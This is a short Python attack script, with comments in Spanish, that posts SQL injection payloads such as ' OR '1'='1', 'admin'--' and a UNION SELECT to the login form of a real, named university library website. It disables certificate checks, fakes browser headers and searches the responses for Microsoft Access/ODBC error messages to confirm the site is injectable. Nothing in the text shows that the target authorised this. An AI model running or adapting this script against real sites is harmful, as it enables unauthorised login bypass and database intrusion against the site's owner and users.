import requests, urllib3, re, hashlib
urllib3.disable_warnings()

BASE = "https://biblioteca.uns.edu.pe"
h = {'User-Agent': 'Mozilla/5.0', 'Referer': BASE + '/inicia_sesion.asp'}

print("="*60)
print("INSPECCION DE RESPUESTA SQLI - ERRORES DB REALES")
print("="*60)

# Obtener respuesta completa de SQLi para ver si hay error DB real
sqli_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT NULL--",
    "' OR ''='",
    "admin' OR 1=1--",
]

for payload in sqli_payloads:
    data = {'t_usuario': payload, 't_clave': 'test', 'modo': 'U', 'B1': 'Iniciar Sesion'}
    r = requests.post(BASE + '/login.asp', data=data, headers=h, verify=False, timeout=8, allow_redirects=True)
    
    # Buscar errores reales en la respuesta
    text = r.text.lower()
    err_context = []
    for kw in ['error', 'microsoft', 'odbc', 'jet', 'oledb', 'access', 'syntax', 'provider', 'exception', '800a0']:
        if kw in text:
            idx = text.index(kw)
            ctx = r.text[max(0, idx-50):idx+200].replace('\r\n', ' ').replace('\n', ' ')
            err_context.append(f"[{kw}] ...{ctx}...")
    
    if err_context:
        print(f"\n[!!] PAYLOAD: {payload!r}")
        print(f"     URL final: {r.url}")
        for ctx in err_context[:2]:
            print(f"     {ctx[:300]}")
    else:
        print(f"\n[ ] {payload!r} -> URL={r.url}, sin error DB visible")
